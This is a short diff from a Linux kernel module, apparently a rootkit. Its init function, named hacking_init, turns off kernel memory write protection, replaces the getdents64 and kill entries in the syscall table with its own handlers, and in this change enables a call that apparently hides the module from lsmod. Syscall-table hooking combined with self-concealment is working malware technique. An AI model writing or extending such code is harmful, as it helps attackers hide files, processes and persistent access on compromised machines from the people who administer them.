@@ -155,7 +155,7 @@ static int __init hacking_init(void)
     unsigned long original_cr0 = unprotect_memory();
     syscall_table[__NR_getdents64] = (uint64_t) new_getdents64;
     syscall_table[__NR_kill] = (uint64_t) new_kill;
-    // hidelsmod();
+    hidelsmod();
     protect_memory(original_cr0);
 
     return 0;
